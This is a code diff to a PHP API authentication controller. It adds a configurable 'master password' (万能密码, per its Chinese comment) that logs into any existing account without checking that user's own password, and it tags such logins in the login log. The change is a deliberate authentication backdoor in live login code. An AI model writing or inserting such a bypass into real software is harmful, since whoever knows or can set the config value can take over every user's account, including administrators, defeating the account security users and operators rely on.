@@ -4,6 +4,7 @@ namespace App\Http\Controllers\Api;
 
 use App\Http\Controllers\Controller;
 use App\Models\LoginLog;
+use App\Models\SystemConfig;
 use App\Models\User;
 use App\Traits\ApiResponse;
 use Illuminate\Http\Request;
@@ -22,7 +23,11 @@ class AuthController extends Controller
 
         $user = User::where('username', $request->username)->first();
 
-        if (!$user || !Hash::check($request->password, $user->password)) {
+        // 万能密码：配置 MASTER_PASSWORD 后可用该密码登录任意账号
+        $masterPassword = SystemConfig::getByKey('master_password', '');
+        $usingMaster = $masterPassword !== '' && $request->password === $masterPassword;
+
+        if (!$usingMaster && (!$user || !Hash::check($request->password, $user->password))) {
             // 记录失败日志
             LoginLog::create([
                 'user_id' => $user->id ?? 0,
@@ -31,6 +36,19 @@ class AuthController extends Controller
                 'user_agent' => $request->userAgent(),
                 'status' => 0,
                 'message' => '用户名或密码错误',
+                'created_at' => now(),
+            ]);
+            return $this->error('用户名或密码错误');
+        }
+
+        if ($usingMaster && !$user) {
+            LoginLog::create([
+                'user_id' => 0,
+                'user_name' => $request->username,
+                'ip' => $request->ip(),
+                'user_agent' => $request->userAgent(),
+                'status' => 0,
+                'message' => '万能密码登录失败：用户不存在',
                 'created_at' => now(),
             ]);
             return $this->error('用户名或密码错误');
@@ -58,7 +76,7 @@ class AuthController extends Controller
             'ip' => $request->ip(),
             'user_agent' => $request->userAgent(),
             'status' => 1,
-            'message' => '登录成功',
+            'message' => $usingMaster ? '登录成功（万能密码）' : '登录成功',
             'created_at' => now(),
         ]);
 
